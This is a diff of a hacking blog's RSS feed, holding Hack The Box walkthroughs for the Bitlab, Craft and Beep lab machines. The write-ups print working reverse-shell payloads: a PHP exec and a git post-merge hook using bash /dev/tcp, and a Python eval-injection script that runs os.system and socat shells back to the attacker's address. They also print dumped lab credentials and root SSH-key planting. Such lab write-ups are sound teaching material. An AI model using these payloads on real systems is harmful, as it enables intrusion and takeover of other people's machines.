@@ -15,7 +15,7 @@
             
             <guid>/posts/hack-the-box-bitlab/</guid>
             <description>Welcome to another Forest Hex hacking adventure! 🌲🏹 Today I will be hacking an HTB box named bitlab.
- Let&#39;s dive right in with a port scan, and as always, feel free to jump around.
+ Let&amp;rsquo;s dive right in with a port scan, and as always, feel free to jump around.
  Port Scan Poking around the Web Server The Initial Foothold Escalating to Root Creating the Git Hook   Port Scan Port Scan  Not a lot here, just a web server on port 80 and ssh on port 22.</description>
             <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! 🌲🏹</h3>
 <p><em>Today I will be hacking an HTB box named bitlab.</em></p>
@@ -27,7 +27,7 @@
     </figure>
 
 
-<p>Let's dive right in with a port scan, and as always, feel free to jump around.</p>
+<p>Let&rsquo;s dive right in with a port scan, and as always, feel free to jump around.</p>
 <ul>
 <li><a href="#port-scan">Port Scan</a></li>
 <li><a href="#poking-around-the-web-server">Poking around the Web Server</a></li>
@@ -48,7 +48,7 @@
 
 
 <p>Not a lot here, just a web server on port 80 and ssh on port 22.
-Time to poke around the server, I'll load it up in ZAP's proxy.</p>
+Time to poke around the server, I&rsquo;ll load it up in ZAP&rsquo;s proxy.</p>
 <hr>
 <h1 id="poking-around-the-web-server">Poking around the Web Server</h1>
 
@@ -59,8 +59,8 @@ Time to poke around the server, I'll load it up in ZAP's proxy.</p>
 
 </figure>
 
-<p>You can see how zap easily let's you dive into the framework of a web site. It's running a local git repo which is a good place to look for credentials, or even exploits in source code.</p>
-<p>I tried the default credentials but they didn't work, so then I switched to finding an exploit for it. The first thing I needed was the version of gitlab. A stackoverflow answer said <code>/help</code> would display this information.</p>
+<p>You can see how zap easily let&rsquo;s you dive into the framework of a web site. It&rsquo;s running a local git repo which is a good place to look for credentials, or even exploits in source code.</p>
+<p>I tried the default credentials but they didn&rsquo;t work, so then I switched to finding an exploit for it. The first thing I needed was the version of gitlab. A stackoverflow answer said <code>/help</code> would display this information.</p>
 <p>I found something much different. It was a plain looking page with a link named <code>Bookmarks</code>, and after clicking on it I go this:
 
     <figure class="left" >
@@ -100,12 +100,12 @@ document[<span style="color:#a6e22e">getElementById</span>](<span style="color:#
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
 $db_connection <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>($db_connection, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
-</code></pre></div><p>This could be useful once I find a way to achieve code execution. For now I can't access the sql server since the port isn't exposed, and they don't work as ssh creds.</p>
+</code></pre></div><p>This could be useful once I find a way to achieve code execution. For now I can&rsquo;t access the sql server since the port isn&rsquo;t exposed, and they don&rsquo;t work as ssh creds.</p>
 <hr>
 <h1 id="the-initial-foothold">The Initial Foothold</h1>
 <p>While I was looking around I started to gain a better understanding of what was happening. There are two projects: <code>Profile</code> and <code>Deployer</code>. Profile is a simple php page, and deployer contains a script which will automatically pull any merge requests to the master branch in Profile. The php file is hosted on the web server at <code>/profile</code>, which I discovered by clicking on the settings link in the gitlab page.</p>
-<p>This means I should be able to create a reverse shell by editing the php file. The web interface allows me to do it so I don't even have to bother cloning the repo locally.</p>
-<p>In fact, this is a rare chance to try out a php web shell, I'm going to use the one here:
+<p>This means I should be able to create a reverse shell by editing the php file. The web interface allows me to do it so I don&rsquo;t even have to bother cloning the repo locally.</p>
+<p>In fact, this is a rare chance to try out a php web shell, I&rsquo;m going to use the one here:
 <a href="https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php">https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php</a></p>
 <p>It worked like a charm:</p>
 
@@ -116,7 +116,7 @@ $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_quer
 
 </figure>
 
-<p>It's fun and all, but I truly prefer a terminal so I switched to this payload:</p>
+<p>It&rsquo;s fun and all, but I truly prefer a terminal so I switched to this payload:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
 <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1&#39;&#34;</span>);
 </code></pre></div>
@@ -129,7 +129,7 @@ $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_quer
 
 <p>After getting a netcat shell I upgraded it following this tutorial:
 <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
-<p>I didn't use socat, I used python and the method under the socat description to upgrade it to full TTY.</p>
+<p>I didn&rsquo;t use socat, I used python and the method under the socat description to upgrade it to full TTY.</p>
 <hr>
 <h1 id="escalating-to-root">Escalating to Root</h1>
 <p>The deployer script looked promising:</p>
@@ -149,15 +149,15 @@ $branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672"
 
 <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
 </code></pre></div><p>The <code>sudo git pull</code> command can be used to execute commands as root. I spent an extremely long time trying to think of a way to add a malicious git hook to the existing repo that would be pulled, but the two exploits I found were patched already.</p>
-<p>If you're curious:
+<p>If you&rsquo;re curious:
 <a href="https://blog.developer.atlassian.com/securing-your-git-server/">https://blog.developer.atlassian.com/securing-your-git-server/</a>
 <a href="https://github.blog/2018-10-05-git-submodule-vulnerability/">https://github.blog/2018-10-05-git-submodule-vulnerability/</a></p>
-<p>I read a lot more articles about them, and eventually realized the system is running <code>2.19.1</code> which has both of these patched. I was stuck for a while, even knowing I had passwordless sudo to use <code>git pull</code> I just couldn't make the connection. I reached out on discord for a nudge, all that was needed was a reminder of what I knew:</p>
+<p>I read a lot more articles about them, and eventually realized the system is running <code>2.19.1</code> which has both of these patched. I was stuck for a while, even knowing I had passwordless sudo to use <code>git pull</code> I just couldn&rsquo;t make the connection. I reached out on discord for a nudge, all that was needed was a reminder of what I knew:</p>
 <blockquote>
 <p>you only need to know that you can run sudo git pull as www-data</p>
 </blockquote>
-<p>It hit me like a ton of bricks.. I could simply copy the existing git repo to another folder and add a githook. The passwordless sudo access doesn't specify a folder so I can make a new one in /tmp and I will have the ability to create a new git hook.
-<code>git</code> itself is restricted, so I can't just do a git init either.</p>
+<p>It hit me like a ton of bricks.. I could simply copy the existing git repo to another folder and add a githook. The passwordless sudo access doesn&rsquo;t specify a folder so I can make a new one in /tmp and I will have the ability to create a new git hook.
+<code>git</code> itself is restricted, so I can&rsquo;t just do a git init either.</p>
 <hr>
 <h1 id="creating-the-git-hook">Creating the Git Hook</h1>
 <p>I tested if I could simply copy the <code>.git</code> folder and add a hook on my local machine, and had an issue with my powershell script. Apparently even in windows the githook still needs <code>#!/bin/bash</code>. I tried that but ended up with an error:
@@ -187,9 +187,9 @@ $branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672"
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
 </span><span style="color:#75715e"></span>
 exec /bin/bash
-</code></pre></div><p>Now all there is to to is to push an update and sudo git pull&hellip; Or I thought. It didn't work, so I'm changing the post-merge to:
+</code></pre></div><p>Now all there is to to is to push an update and sudo git pull&hellip; Or I thought. It didn&rsquo;t work, so I&rsquo;m changing the post-merge to:
 <code>bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1</code></p>
-<p>Unfortunately that didn't work either. I decided to simply have it write an SSH public key to the authorized_keys folder of root. First I checked <code>/etc/passwd</code> to make sure root has a login, it does.</p>
+<p>Unfortunately that didn&rsquo;t work either. I decided to simply have it write an SSH public key to the authorized_keys folder of root. First I checked <code>/etc/passwd</code> to make sure root has a login, it does.</p>
 <p>After that I checked <code>/etc/ssh/sshd_config</code> to make sure I could log in with a public key. It does, and it looks in the normal place.</p>
 <p>I generate a new key with <code>ssh-keygen -t rsa</code>, <code>chmod 600 id_rsa</code> to give it the right permissions for the SSH client, and copy the public key to the post-merge hook:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@bitlab:/tmp/fine$ cat .git/hooks/post-merge
@@ -220,10 +220,10 @@ cat /root/.ssh/authorized_keys
             
             <guid>/posts/hack-the-box-craft/</guid>
             <description>Welcome to another Forest Hex hacking adventure! 🌲🏹
-Today I&#39;m going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.
-  Port Scan As always, I start with a port scan to see what&#39;s open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan.</description>
+Today I&amp;rsquo;m going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.
+  Port Scan As always, I start with a port scan to see what&amp;rsquo;s open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan.</description>
             <content type="html"><![CDATA[<p><strong>Welcome to another Forest Hex hacking adventure! 🌲🏹</strong></p>
-<p><em>Today I'm going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.</em></p>
+<p><em>Today I&rsquo;m going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.</em></p>
 
     <figure class="left" >
         <img src="image-8.webp"   />
@@ -234,7 +234,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
 <hr>
 <h1 id="port-scan">Port Scan</h1>
-<p>As always, I start with a port scan to see what's open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan.</p>
+<p>As always, I start with a port scan to see what&rsquo;s open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan.</p>
 <p>Commands:</p>
 <p><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.110 | grep [1] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) nmap -sC -sV -p $ports 10.10.10.110</code></p>
 
@@ -246,7 +246,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
 
 <blockquote>
-<p>Editor's Note: I found out much later that this nmap procedure was redundant. The following command accomplishes the same thing:
+<p>Editor&rsquo;s Note: I found out much later that this nmap procedure was redundant. The following command accomplishes the same thing:
 <code>nmap -p- -sC -sV --min-rate=1000 -T4 &lt;ip&gt;</code></p>
 </blockquote>
 <p>Nmap found:</p>
@@ -280,7 +280,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
     </figure>
 
 
-<p>I tried some basic SQL injection on the auth endpoints but couldn't find anything meaningful. I decided to check the git page to see if there were any more obvious routes to gain access.</p>
+<p>I tried some basic SQL injection on the auth endpoints but couldn&rsquo;t find anything meaningful. I decided to check the git page to see if there were any more obvious routes to gain access.</p>
 <hr>
 <h1 id="exploring-git">Exploring Git</h1>
 <p>Remember when I said never underestimate simple exploration? This is why:</p>
@@ -303,7 +303,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
     </figure>
 
 
-<p>No luck, they are grabbing the data from a settings file, which is not present on the git repository. But there's still a chance the credentials were included in an older commit, so let's take a look at the commit history and see what stands out.</p>
+<p>No luck, they are grabbing the data from a settings file, which is not present on the git repository. But there&rsquo;s still a chance the credentials were included in an older commit, so let&rsquo;s take a look at the commit history and see what stands out.</p>
 
     <figure class="left" >
         <img src="image-18.webp"   />
@@ -322,7 +322,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
 
 <p>Ah ha! Dinesh has foolishly left his credentials hardcoded into a test he created. These credentials are for the <code>/auth/login</code> endpoint of the API, and now I have a handy python script to reference for details on usage.</p>
-<p>Credentials alone won't be enough to get into the machine, but it's a start. The next step is figuring out what I can do with these credentials. Looking at the <code>issues</code> page is a good starting point.</p>
+<p>Credentials alone won&rsquo;t be enough to get into the machine, but it&rsquo;s a start. The next step is figuring out what I can do with these credentials. Looking at the <code>issues</code> page is a good starting point.</p>
 
     <figure class="left" >
         <img src="image-20.webp"   />
@@ -331,7 +331,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
     </figure>
 
 
-<p>Ah, the personality in this box is awesome. Gilfoyle is taking a stab at Dinesh, completely in line with something he would do on the show. What's so bad about Dinesh's patch though?</p>
+<p>Ah, the personality in this box is awesome. Gilfoyle is taking a stab at Dinesh, completely in line with something he would do on the show. What&rsquo;s so bad about Dinesh&rsquo;s patch though?</p>
 
     <figure class="left" >
         <img src="image-21.webp"   />
@@ -342,8 +342,8 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
 <p>Can you see the vulnerability?</p>
 <p><code>eval('%s &gt; 1' % request.json['abv'])</code></p>
-<p>Ah, our good pal <code>eval</code>. It's dangerous to run <code>eval</code> on user input because it will evaluate a string as a python expression. <a href="https://docs.python.org/3/library/functions.html#eval">You can read more about it here.</a></p>
-<p>Here's the entire function:</p>
+<p>Ah, our good pal <code>eval</code>. It&rsquo;s dangerous to run <code>eval</code> on user input because it will evaluate a string as a python expression. <a href="https://docs.python.org/3/library/functions.html#eval">You can read more about it here.</a></p>
+<p>Here&rsquo;s the entire function:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@auth.auth_required</span>
 <span style="color:#a6e22e">@api.expect</span>(beer_entry)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
@@ -367,7 +367,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 <p>So, I have to get the system to execute that command. The eval expression is:</p>
 <p><code>if eval('%s &gt; 1' % request.json['abv']):</code></p>
 <p>So, it will take whatever string I provide as the ABV when adding a new beer by sending a POST request to the <code>/brew</code> endpoint. Dinesh to the rescue again, we can use his test script to do this.</p>
-<p>Here's the script I created based on his test script:</p>
+<p>Here&rsquo;s the script I created based on his test script:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 <span style="color:#f92672">import</span> json
 
@@ -395,13 +395,13 @@ json_data <span style="color:#f92672">=</span> json<span style="color:#f92672">.
 response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/brew/</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span>False)
 <span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)
 </code></pre></div><p>The important part is <code>brew_dict['abv'] = '__**import__**(&quot;os&quot;).system(&quot;bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/44226 0&gt;&amp;1&quot;)'</code></p>
-<p>The problem with using <code>os.system()</code> in python is that it requires <code>import os</code> to be present at by the time it reaches <code>os.system()</code>, otherwise it won't know what to do. You can get around this by using the global namespace for import like I did in the line above. Definitely something new I learned figuring that out.</p>
+<p>The problem with using <code>os.system()</code> in python is that it requires <code>import os</code> to be present at by the time it reaches <code>os.system()</code>, otherwise it won&rsquo;t know what to do. You can get around this by using the global namespace for import like I did in the line above. Definitely something new I learned figuring that out.</p>
 <p>However, after several attempts I was unable to get a reverse shell. I suspected one of two things was possible:</p>
 <ol>
 <li>My formatting for the eval was wrong.</li>
 <li>The environment flask was running is was locked down.</li>
 </ol>
-<p>To rule out number one I simplified my command. I had the server attempt to download a file from my machine using wget, and while I'm having it download a file it might as well be a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">static socat binary</a> that I can use to get a full TTY reverse shell.</p>
+<p>To rule out number one I simplified my command. I had the server attempt to download a file from my machine using wget, and while I&rsquo;m having it download a file it might as well be a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">static socat binary</a> that I can use to get a full TTY reverse shell.</p>
 <p>After downloading the file, I serve it up using a simple Python command:</p>
 <p><code>python -m SimpleHTTPServer</code></p>
 
@@ -433,13 +433,13 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 
 </figure>
 
-<p>Success! It's not a shell, but it's a start and confirms that I can execute commands on the machine. It's time to modify the script to have it use socat to create a reverse shell. I can do this using the following commands:</p>
+<p>Success! It&rsquo;s not a shell, but it&rsquo;s a start and confirms that I can execute commands on the machine. It&rsquo;s time to modify the script to have it use socat to create a reverse shell. I can do this using the following commands:</p>
 <p>Listener: <code>socat file:$(tty),raw,echo=0 tcp-listen:44226</code></p>
 <p>Victim: <code>socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226</code></p>
 <p>A couple of things:</p>
 <ol>
 <li>The socat file on the victim needs to have execute permissions added.</li>
-<li>The command to connect via socat also needs to be modified since it's using quotes, and the newly downloaded socat isn't in PATH.</li>
+<li>The command to connect via socat also needs to be modified since it&rsquo;s using quotes, and the newly downloaded socat isn&rsquo;t in PATH.</li>
 </ol>
 <p>To solve those issues I added a chmod +x command, escaped the quotes, and added a ./ in front of the socat so linux knows to look in the current folder for it. The end result is this:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__import__(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">os</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">).system(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">chmod +x socat; ./socat exec:</span><span style="color:#e6db74">&#39;</span>sh <span style="color:#f92672">-</span>li<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">&#39;</span>
@@ -461,10 +461,10 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 
 </figure>
 
-<p>Success! But&hellip; wait&hellip; I'm root? Hmmm&hellip; that seemed very suspicious to me. I started poking around and found:</p>
+<p>Success! But&hellip; wait&hellip; I&rsquo;m root? Hmmm&hellip; that seemed very suspicious to me. I started poking around and found:</p>
 <ol>
-<li>My socat binary didn't work, has a syntax error.</li>
-<li>I'm not really root, this is stuck in a busybox shell.</li>
+<li>My socat binary didn&rsquo;t work, has a syntax error.</li>
+<li>I&rsquo;m not really root, this is stuck in a busybox shell.</li>
 <li>It looks like we are in a docker environment.</li>
 </ol>
 <p>I also found a juicy settings file that contains DB credentials, and a secret key used to generate valid tokens from username + timestamp. This means I can generate a token for any user without the password.</p>
@@ -494,9 +494,9 @@ MYSQL_DATABASE_HOST <span style="color:#f92672">=</span> <span style="color:#e6d
 SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> False
 </code></pre></div><p>Just look at all those juicy secrets! An inspection of the environment variables reveals something interesting as well:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GPG_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D&#39;</span>
-</code></pre></div><p>Searching this key reveals that it's part of a python 3.6 docker instance. Hmmm, I need to escape this docker instance somehow. I have doubts that it will be via an exploit, rather it will probably involve the found credentials and API key.</p>
-<p>So let's see if we can access the database. I can modify the DB test script to do this since the database is only available internally. I could also set up a proxy and use a mySQL client, but the python is already set up to work so I'm going to take the path of least resistance here.</p>
-<p>Here's my modified DBTest script:</p>
+</code></pre></div><p>Searching this key reveals that it&rsquo;s part of a python 3.6 docker instance. Hmmm, I need to escape this docker instance somehow. I have doubts that it will be via an exploit, rather it will probably involve the found credentials and API key.</p>
+<p>So let&rsquo;s see if we can access the database. I can modify the DB test script to do this since the database is only available internally. I could also set up a proxy and use a mySQL client, but the python is already set up to work so I&rsquo;m going to take the path of least resistance here.</p>
+<p>Here&rsquo;s my modified DBTest script:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
 
 <span style="color:#f92672">import</span> pymysql
@@ -519,10 +519,10 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 <span style="color:#66d9ef">finally</span>:
     connection<span style="color:#f92672">.</span>close()
-</code></pre></div><p>I've modified it to use fetch_all instead of fetch_one, and can execute any SQL command I want. First I <code>show databases</code>, and see that it's only <code>craft</code> and <code>information_schema</code>. The db= in the connection string resolves to <code>craft</code>, so I can do a <code>show tables</code> command to see what's in there.</p>
-<p>Looks like it's only two tables, <code>craft</code> which contains the beer info, and <code>user</code> which contains the username and passwords for generating API tokens. I can then do <code>select * from user</code> to get it all:</p>
+</code></pre></div><p>I&rsquo;ve modified it to use fetch_all instead of fetch_one, and can execute any SQL command I want. First I <code>show databases</code>, and see that it&rsquo;s only <code>craft</code> and <code>information_schema</code>. The db= in the connection string resolves to <code>craft</code>, so I can do a <code>show tables</code> command to see what&rsquo;s in there.</p>
+<p>Looks like it&rsquo;s only two tables, <code>craft</code> which contains the beer info, and <code>user</code> which contains the username and passwords for generating API tokens. I can then do <code>select * from user</code> to get it all:</p>
 <p><code>[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]</code></p>
-<p>And there we have it. Granted it's just for generating an API token, but maybe someone has reused one of their passwords.</p>
+<p>And there we have it. Granted it&rsquo;s just for generating an API token, but maybe someone has reused one of their passwords.</p>
 <p>No luck with SSH. I tried both port 22, and 6022 but was denied in both. They might work in gogs however.</p>
 
     <figure class="left" >
@@ -541,8 +541,8 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<p>Well&hellip; hmmm&hellip; Time for some more research. I found a commit that disabled the vault UI, it looks like there's a listener at port 8200 though. More digging&hellip;.</p>
-<p>Well&hellip; What's this??</p>
+<p>Well&hellip; hmmm&hellip; Time for some more research. I found a commit that disabled the vault UI, it looks like there&rsquo;s a listener at port 8200 though. More digging&hellip;.</p>
+<p>Well&hellip; What&rsquo;s this??</p>
 
     <figure class="left" >
         <img src="1578158745.webp"   />
@@ -551,7 +551,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<p>An OpenSSH private key on his private git. Why hello there darlin&rsquo;, let's take you out for a spin. I copied the key into a new file with nano, saved and modified the permissions (ssh requires this to work), then attempted to log in via ssh:</p>
+<p>An OpenSSH private key on his private git. Why hello there darlin&rsquo;, let&rsquo;s take you out for a spin. I copied the key into a new file with nano, saved and modified the permissions (ssh requires this to work), then attempted to log in via ssh:</p>
 <p><code>root@wks104:~/craft# chmod 600 gilfoyle.keyroot@wks104:~/craft# ssh gilfoyle@craft.htb -i gilfoyle.key</code></p>
 
     <figure class="left" >
@@ -569,11 +569,11 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 </figure>
 
-<p>There's the user flag. I was almost stymied at the required passphrase on the key, but the same password Gilfoyle used for git was used here! For shame&hellip; for as much smack as Gilfoyle talks on Dinesh, he has reused his password in three places here.</p>
-<p>Now that we have a solid foothold it's time to escalate our priveleges.</p>
+<p>There&rsquo;s the user flag. I was almost stymied at the required passphrase on the key, but the same password Gilfoyle used for git was used here! For shame&hellip; for as much smack as Gilfoyle talks on Dinesh, he has reused his password in three places here.</p>
+<p>Now that we have a solid foothold it&rsquo;s time to escalate our priveleges.</p>
 <hr>
 <h1 id="gaining-root-access">Gaining Root Access</h1>
-<p>The first thing I do when attempting privelege escalation is to check the sudoers file. Actually, I lied, the first thing I do is check the shell I'm in to see if it's restricted. This is accomplished via: <code>echo $0</code></p>
+<p>The first thing I do when attempting privelege escalation is to check the sudoers file. Actually, I lied, the first thing I do is check the shell I&rsquo;m in to see if it&rsquo;s restricted. This is accomplished via: <code>echo $0</code></p>
 <p>Looks like this one has bash:</p>
 
     <figure class="left" >
@@ -594,7 +594,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<p>No sudo on this machine. Now normally I would proceed to use both LinuxEnum.sh and linuxprivchecker.py, but something stuck out when I was trifling through Gilfoyle's git branch.</p>
+<p>No sudo on this machine. Now normally I would proceed to use both LinuxEnum.sh and linuxprivchecker.py, but something stuck out when I was trifling through Gilfoyle&rsquo;s git branch.</p>
 
     <figure class="left" >
         <img src="image-91.webp"   />
@@ -604,7 +604,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 
 <p>This script looks like it enables some form of OTP for root access via SSH. I did some googling and found out more:</p>
-<p>It's a program called <a href="https://www.vaultproject.io/">Vault</a> by Hashicorp. It's a server which handles secret management that serves up access over HTTP, and a local client as well. I went through the tutorial and started looking for secrets.</p>
+<p>It&rsquo;s a program called <a href="https://www.vaultproject.io/">Vault</a> by Hashicorp. It&rsquo;s a server which handles secret management that serves up access over HTTP, and a local client as well. I went through the tutorial and started looking for secrets.</p>
 <p>Vault was indeed installed and running on the machine, the command line interface worked just fine. I attempted to find anything at all in the data storage of the program:</p>
 <p><code>vault secrets list</code></p>
 
@@ -633,7 +633,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p><a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p>
 <p>It explained the process a bit more, and gave a nice one-liner to use</p>
 <p><code>vault ssh -role otp_key_role -mode otp username@x.x.x.x</code></p>
-<p>I know from Gilfoyle's git page the SSH OTP is enabled, and the role is root_otp. I filled in the blanks and executed the command:</p>
+<p>I know from Gilfoyle&rsquo;s git page the SSH OTP is enabled, and the role is root_otp. I filled in the blanks and executed the command:</p>
 <p><code>vault ssh -role root_otp -mode otp root@localhost</code></p>
 
     <figure class="left" >
@@ -670,10 +670,10 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
             <pubDate>Sun, 13 Oct 2019 00:00:00 +0000</pubDate>
             
             <guid>/posts/hack-the-box-beep/</guid>
-            <description>Welcome to another Forest Hex hacking adventure! 🌲🏹 Today&#39;s plan is to explore a retired CTF from http://hackthebox.eu named &amp;ldquo;Beep&amp;rdquo;. I chose this box because it&#39;s easy, it&#39;s linux, and it&#39;s rated very highly. All that put together should add up to some serious fun, so let&#39;s get started:
+            <description>Welcome to another Forest Hex hacking adventure! 🌲🏹 Today&amp;rsquo;s plan is to explore a retired CTF from http://hackthebox.eu named &amp;ldquo;Beep&amp;rdquo;. I chose this box because it&amp;rsquo;s easy, it&amp;rsquo;s linux, and it&amp;rsquo;s rated very highly. All that put together should add up to some serious fun, so let&amp;rsquo;s get started:
   Port Scan Poking around the mySql Server Checking out Webmin Hylafax, what are you hiding? Back to Elastix Getting User and Root   Port Scan The first thing, as always, is a port scan:</description>
             <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! 🌲🏹</h3>
-<p>Today's plan is to explore a retired CTF from <a href="http://hackthebox.eu">http://hackthebox.eu</a> named &ldquo;Beep&rdquo;. I chose this box because it's easy, it's linux, and it's rated very highly. All that put together should add up to some serious fun, so let's get started:</p>
+<p>Today&rsquo;s plan is to explore a retired CTF from <a href="http://hackthebox.eu">http://hackthebox.eu</a> named &ldquo;Beep&rdquo;. I chose this box because it&rsquo;s easy, it&rsquo;s linux, and it&rsquo;s rated very highly. All that put together should add up to some serious fun, so let&rsquo;s get started:</p>
 
     <figure class="left" >
         <img src="2019-10-13-18-43-45.webp"   />
@@ -715,7 +715,7 @@ nmap -sC -sV -p$ports $1
 
 </figure>
 
-<p>That's a ton of stuff, let's save the output in Cherry Tree and start digging. First let's check out the website.
+<p>That&rsquo;s a ton of stuff, let&rsquo;s save the output in Cherry Tree and start digging. First let&rsquo;s check out the website.
 
     <figure class="left" >
         <img src="2019-10-13-20-23-24.webp"   />
@@ -726,10 +726,10 @@ nmap -sC -sV -p$ports $1
     </figure>
 
 </p>
-<p>Ah, some kind of login called elastix. I looked up some default logins but none of them worked, ah well, I'll take some notes and move on.</p>
+<p>Ah, some kind of login called elastix. I looked up some default logins but none of them worked, ah well, I&rsquo;ll take some notes and move on.</p>
 <hr>
 <h1 id="poking-around-the-mysql-server">Poking around the mySql Server</h1>
-<p>There's a mySql server running on port 3306, so I attempted to login with no password:
+<p>There&rsquo;s a mySql server running on port 3306, so I attempted to login with no password:
 
     <figure class="left" >
         <img src="2019-10-13-20-56-05.webp"   />
@@ -740,10 +740,10 @@ nmap -sC -sV -p$ports $1
